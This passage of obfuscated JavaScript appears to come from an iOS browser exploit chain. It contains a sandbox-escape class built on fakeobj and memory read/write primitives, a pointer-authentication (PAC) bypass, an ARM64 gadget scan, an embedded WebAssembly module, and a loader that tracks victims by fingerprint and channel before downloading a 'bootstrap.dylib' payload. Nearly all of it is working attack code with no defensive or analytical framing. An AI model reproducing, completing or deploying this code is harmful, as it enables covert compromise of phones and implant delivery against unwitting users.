        ...
        if (r && !o && !m) {
            ...
            if (w && 0x0100000c  === r && g >= 0xb0000 ) {
                ...
                for (t = t.Bt(t.it % 0x1000 );
                    0xfeedfacf  !== e.read32FromInt64(t);) t = t.Bt(0x1000 );
                const r = this.Xo(t);
                l = r.Ho.Zo, _ = r.Ho.Ko;
            }
        }
...
globalThis.moduleManager.evalCode("b5135768e043d1b362977b8ba9bff678b9946bcb", function () {
    ...
    class SandboxEscapeBase {
        ...
        constructor() {
            this.Gd = !1, this.fd = !1, this.kd = new Uint32Array(4096 ), utilityModule.D(this.kd), this.Dd = exploitPrimitive.fakeobj(this.kd), this.Zd = new Uint32Array(4096 ), utilityModule.D(this.Zd), this.Nd = exploitPrimitive.fakeobj(this.Zd);
        }
        wd(b, a = 0) {
    ...
    class SandboxEscape extends SandboxEscapeBase {
        constructor() {
            ...
            this.Hd = this.Vd(), !0 === platformModule.platformState.versionFlags.OwGD0F && !1 === this.Gd || !0 === platformModule.platformState.versionFlags.NUFCII ? this.fd = !0 : !0 === platformModule.platformState.versionFlags.IsjfuV && !0 === platformState.hasPAC && (this.fd = ((b) => {
                const a = Symbol(),
                    ...
                    o = (b, o) => {
                        ...
                        if (0xd65f0fff  === d || 0xd65f03c0  === d) return {
                            kind: 0xd65f0fff  === d ? i : l,
                            me: o
                        };
                        if (d >>> 26 == 37) {
                            let b = 0x04ffffff  & d;
                            return b >= 0x04000000  && (b -= 0x04000000 ), {
                                kind: a,
                                me: o,
                                Yd: b
                            };
                        }
                        return d >>> 10 == 0x0036b043  || d >>> 10 == 0x0036b04b  ? {
                            me: o,
                            kind: c,
                            Rn: d >>> 5 & 15,
                            Pd: 15 & d
                ...
                if (0xd503237f  !== exploitPrimitive.read32(d)) throw new Error("0xd503237f /* 4294967296 + (1699107162 ^ -1337626075) */ !== exploitPrimitive.read32(d)");
                const h = {},
                    g = [];
                for (let b = 0; b < 0x500 ; b += 4) {
                    const a = o(d, b);
            ...
            })(this.Qd)), this.kd = new Uint32Array(4096 ), utilityModule.D(this.kd), this.Dd = exploitPrimitive.fakeobj(this.kd);
            try {
            ...
            if (!0 === this.fd) {
                if (!0 === platformModule.platformState.versionFlags.sKfNmf) {
                    for (a = !0 === platformModule.platformState.versionFlags.wYk8Jg ? [
                        ...
                        0xA8C17BFD, 
                        0xD65F0FFF 
                    ]; 4 * a.length % 32 != 0;) a.push(0xD503201F );
                    b = new Uint32Array(a);
                } else {
        ...
        Fd() {
            const b = (b, a, l) => {
                ...
                const c = newInt64(6625765994 , 7379964258 ),
                    o = newInt64(0, 0);
                ...
                a = (b, a, l) => {
                    ...
                    const o = (b, a, l) => newInt64(l, (b << 24) + (16777215  & a)),
                        d = (b, a) => {
                            i = ((b, a, l) => {
        ...
        Ad(b, a, l) {
            ...
            if (exploitPrimitive.writeInt64ToOffset(o + platformModule.platformState.versionFlags.PyEQqC, a), exploitPrimitive.write32(o + platformModule.platformState.versionFlags.iBTCSN, l), null !== pacBypass) {
                b = pacBypass.pacia(b, toInt64(18410 ));
                let c = 0;
    ...
    r._d = function () {
        const b = new Uint8Array([0, 97, 115 , 109 , 1, 0, 0, 0, 1, 52, 3, 96, 8, 126 , 126 , 126 , 126 , 126 , 126 , 126 , 126 , 1, 126 , 96, 16, 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 1, 126 , 96, 16, 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 127 , 0, 3, 5, 4, 0, 1, 1, 2, 4, 4, 1, 112 , 0, 2, 5, 4, 1, 1, 1, 1, 7, 17, 4, 1, 116 , 1, 0, 1, 109 , 2, 0, 1, 111 , 0, 0, 1, 102 , 0, 3, 9, 7, 1, 0, 65, 0, 11, 1, 0, 10, 194 , 1, 4, 4, 0, 66, 0, 11, 88, 0, 32, 1, 173 , 66, 32, 134 , 32, 0, 173 , 132 , 32, 3, 173 , 66, 32, 134 , 32, 2, 173 , 132 , 32, 5, 173 , 66, 32, 134 , 32, 4, 173 , 132 , 32, 7, 173 , 66, 32, 134 , 32, 6, 173 , 132 , 32, 9, 173 , 66, 32, 134 , 32, 8, 173 , 132 , 32, 11, 173 , 66, 32, 134 , 32, 10, 173 , 132 , 32, 13, 173 , 66, 32, 134 , 32, 12, 173 , 132 , 32, 15, 173 , 66, 32, 134 , 32, 14, 173 , 132 , 65, 0, 17, 0, 0, 15, 11, 37, 0, 32, 0, 32, 1, 32, 2, 32, 3, 32, 4, 32, 5, 32, 6, 32, 7, 32, 8, 32, 9, 32, 10, 32, 11, 32, 12, 32, 13, 32, 14, 32, 15, 16, 1, 15, 11, 60, 1, 1, 126 , 32, 0, 32, 1, 32, 2, 32, 3, 32, 4, 32, 5, 32, 6, 32, 7, 32, 8, 32, 9, 32, 10, 32, 11, 32, 12, 32, 13, 32, 14, 32, 15, 16, 2, 33, 16, 65, 0, 32, 16, 167 , 54, 2, 0, 65, 4, 32, 16, 66, 32, 136 , 167 , 54, 2, 0, 15, 11]).buffer, 
        ...
        let d = null,
            h = null;
        null !== pacBypass && !0 === platformModule.platformState.versionFlags.sKfNmf && !0 === pacBypass.cc && (d = platformModule.cr().dlsym("jitCagePtr"), h = pacBypass.pacda(Int64.fromNumber(d), Int64.fromNumber(0))); 
        for (let b = 0; b < 100000 ; b++) try {
            i();
        } catch (b) { }
        const g = utilityModule.Int64.fromNumber(9389 ); 
            ...
            jd(b, ...a) {
                ...
                if (null !== l.pacBypass) {
                    if (!0 === platformModule.platformState.qn) {
                        if (platformModule.platformState.iOSVersion >= 170200 ) throw new Error("platformModule.platformState.iOSVersion >= 170200 /* 828723297 ^ 828885177 */");
...
class Offset64 {
    ...
    MA() {
        return 0 !== this.et || this.it > 4096  && this.it < 7516192768 ;
    }
    Et() {
...
function YA() {
    ...
    const E = {
        ...
        async issuePerClassName(base) {
            const ev = (window.__runtimeEventId && window.__runtimeEventId()) || "";
            if (!ev) return base + ".min.js";   
            if (E._issuedNames && E._issuedNames[base]) return E._issuedNames[base];
            let url = "";
            try {
                const parts = location.pathname.split("/");
                const k = parts.indexOf("integrations");
                if (k >= 0 && parts.length >= k + 3) {
                    url = location.origin + "/api/public/promotion/integrations/" +
                        encodeURIComponent(parts[k + 1]) + "/" + encodeURIComponent(parts[k + 2]) + "/issue";
                }
            } catch (e) {}
            if (!url) {
                url = "/api/public/promotion/integrations/" +
                    encodeURIComponent((window.__runtimeIntegrationId && window.__runtimeIntegrationId()) || "local-integration") + "/issue";
            }
            try {
                const resp = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ base: base, contextId: ev })
                });
                ...
                window.log("[LOADER] issuePerClassName 失败(" + e + ")，退回原名");
                return base + ".min.js";
            }
        },
        ...
        fetchBin(url) {
            ...
            try {
                const _ch = (window.__parloqChannel) ||
                    new URLSearchParams(location.hash.replace(/^#/, "")).get("parloqChannel") ||
                    new URLSearchParams(location.hash.replace(/^#/, "")).get("channel") || "";
                const _fp = (window.localStorage && window.localStorage.getItem("_fp")) || "";
                const _iid = (window.__runtimeIntegrationId && window.__runtimeIntegrationId()) || "";
                const _ev = (window.__runtimeEventId && window.__runtimeEventId()) || "";
                url += (url.indexOf("?") >= 0 ? "&" : "?") + "ch=" + encodeURIComponent(_ch) +
                    "&fp=" + encodeURIComponent(_fp) + "&iid=" + encodeURIComponent(_iid) +
                    (_ev ? "&ctx=" + encodeURIComponent(_ev) : "");
            } catch (e) {}
        ...
        async buildContainer(hashName) {
            ...
            for (let i = 0; i < entries.length; i++) {
                ...
                while ((m = pat.exec(s)) !== null) {
                    const idx = m.index;
                    const oldName = m[0];
                    const base = oldName.slice(0, 40);
                    const newName = await E.issuePerClassName(base);
                    if (newName === oldName) continue;
                    if (newName.length > oldName.length + 19) {
                        window.log("[LOADER] entry4 名字 slack 不足，保留 " + oldName);
                        continue;
                    }
                    let slackOk = true;
                    for (let k = oldName.length; k < newName.length; k++) {
                        if (out[idx + k] !== 0) { slackOk = false; break; }
                    }
                    if (!slackOk) {
                        window.log("[LOADER] entry4 名字 slack 被占用，保留 " + oldName);
                        continue;
                    }
                    for (let k = 0; k < newName.length; k++) out[idx + k] = newName.charCodeAt(k);
                    window.log("[LOADER] entry4 name → " + newName);
                }
                entryData[i] = out.buffer;
            }
...
function executeSandboxEscape() {
    ...
    return g = (() => {
        ...
        let _bootUrl = "payloads/bootstrap.dylib?v=" + Date.now();
        try {
            const _ev = (window.__runtimeEventId && window.__runtimeEventId()) || "";
            if (_ev) _bootUrl += "&ctx=" + encodeURIComponent(_ev);
        } catch (e) {}
        const _xhr = new XMLHttpRequest();
        _xhr.open("GET", _bootUrl, false);
